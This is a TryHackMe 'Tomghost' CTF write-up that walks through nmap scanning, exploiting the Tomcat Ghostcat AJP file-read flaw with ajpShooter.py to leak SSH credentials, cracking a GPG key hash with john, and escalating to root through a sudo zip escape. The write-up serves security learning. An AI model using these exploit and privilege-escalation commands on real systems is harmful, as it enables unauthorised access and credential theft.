@@ -1,0 +1,249 @@
+Tomghost is a intermediate boot2root machine which covers a recently discoverd vulnerability related to Tomcat.
+IP: 10.10.22.195 
+Nmap scan results
+
+Not shown: 996 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
+|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
+|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.30
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/13%OT=22%CT=1%CU=42653%PV=Y%DS=2%DC=T%G=Y%TM=5F8571
+OS:E9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP
+OS:S(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST
+OS:11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+OS:N(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+
+So I did a little research regarding this ajp13 and found out a vulnerability related to this which was found recently.
+
+https://medium.com/@apkash8/hunting-and-exploiting-apache-ghostcat-b7446ef83e74
+
+You can checkout this page for more info and detailed understanding of this vulnerability.
+
+So this vulnerability actually helps us to read sensitive and configuration files on the webserver.
+
+If the following ports are seen to be open then that web server is vulnerable.
+
+Apache tomcat version 6.x,7.x,8.x and 9.x are found to be vulnerable.
+
+https://github.com/00theway/Ghostcat-CNVD-2020-10487
+
+WE can use this tool to exploit this.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM/Machines/machine3/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://10.10.22.195:8080/ 8009 /WEB-INF read
+
+       _    _         __ _                 _            
+      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
+     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
+    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
+    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
+         |__/|_|                                        
+                                                00theway,just for test
+    
+
+[<] 302 302
+[<] Location: /index.txt/
+[<] Content-Length: 0
+
+SO we can access the WEB-INF folder so we can view some of the common files and see if we can get anything.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM/Machines/machine3/Ghostcat-CNVD-2020-10487# python3 ajpShooter.py http://10.10.22.195:8080/ 8009 /WEB-INF/web.xml read
+
+       _    _         __ _                 _            
+      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
+     //_\\ | | '_ \  \ \| '_ \ / _ \ / _ \| __/ _ \ '__|
+    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
+    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
+         |__/|_|                                        
+                                                00theway,just for test
+    
+
+[<] 200 200
+[<] Accept-Ranges: bytes
+[<] ETag: W/"1261-1583902632000"
+[<] Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
+[<] Content-Type: application/xml
+[<] Content-Length: 1261
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+  version="4.0"
+  metadata-complete="true">
+
+  <display-name>Welcome to Tomcat</display-name>
+  <description>
+     Welcome to GhostCat
+        skyfuck:8730281lk############
+  </description>
+
+</web-app>
+
+So we got something interesting.
+
+skyfuck:8730281l############
+
+we can use this key as a password for ssh login.
+lets try to login via ssh.
+
+
+root@LAPTOP-U5913CMD:/home/akshay# ssh skyfuck@10.10.22.195
+The authenticity of host '10.10.22.195 (10.10.22.195)' can't be established.
+ECDSA key fingerprint is SHA256:hNxvmz+AG4q06z8p74FfXZldHr0HJsaa1FBXSoTlnss.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.22.195' (ECDSA) to the list of known hosts.
+skyfuck@10.10.22.195's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+skyfuck@ubuntu:~$ id
+uid=1002(skyfuck) gid=1002(skyfuck) groups=1002(skyfuck)
+skyfuck@ubuntu:~$ 
+
+Woah yes finally got it :)
+
+skyfuck@ubuntu:/home$ cd merlin
+skyfuck@ubuntu:/home/merlin$ ls
+user.txt
+skyfuck@ubuntu:/home/merlin$ cat user.txt
+THM{GhostCat##############}
+
+We will be using gpg2john to convert the tryhackme.asc to a hash.
+I tried sudo -l to check if we got any permissions and also did a quick kernel exploit search but unfortunately we dont have gcc installed in the system.
+Quite smart.
+
+Nada with SUID bit set files.
+I found these two files in /home/skyfuck folder.
+SO I did a search on pgp file and asc and found this method to decrypt the .asc file.
+FOllow me:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM/Machines/machine3# gpg2john tryhackme.asc > hash
+
+File tryhackme.asc
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM/Machines/machine3# cat hash
+tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM/Machines/machine3# john hash --wordlist=/home/akshay/Downloads/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+alexandru        (tryhackme)
+1g 0:00:00:00 DONE (2020-10-13 15:53) 5.555g/s 6000p/s 6000c/s 6000C/s theresa..brownie
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/LinuxPrivEscalationTCM/Machines/machine3# 
+
+password:alexandru
+
+skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
+gpg: key C6707170: secret key imported
+gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
+gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
+gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
+gpg: Total number processed: 2
+gpg:               imported: 1
+gpg:              unchanged: 1
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 
+
+You need a passphrase to unlock the secret key for
+user: "tryhackme <stuxnet@tryhackme.com>"
+1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)
+
+gpg: gpg-agent is not available in this session
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
+      "tryhackme <stuxnet@tryhackme.com>"
+merlin:asuyusdoiuqoilkda###############################
+
+We got password for merlin noice.
+
+merlin:asuyusdoiuqoilkda312j###############################
+
+Lets change the user to merlin.
+
+skyfuck@ubuntu:~$ su merlin
+Password: 
+merlin@ubuntu:/home/skyfuck$ id
+uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+merlin@ubuntu:/home/skyfuck$ 
+merlin@ubuntu:~$ sudo -l
+Matching Defaults entries for merlin on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+merlin@ubuntu:~$ 
+
+So we can use zip to get root access.
+I found this on gtfobins.
+Here the link:
+https://gtfobins.github.io/gtfobins/zip/#sudo
+
+merlin@ubuntu:~$ TF=$(mktemp -u)
+merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# cat root.txt
+THM{###############}
+# 
+
+It was great machine as it covers a real world related vulnerability.
+
+Thank you...Happy Hacking :)
+
+-Voker2311
+
+
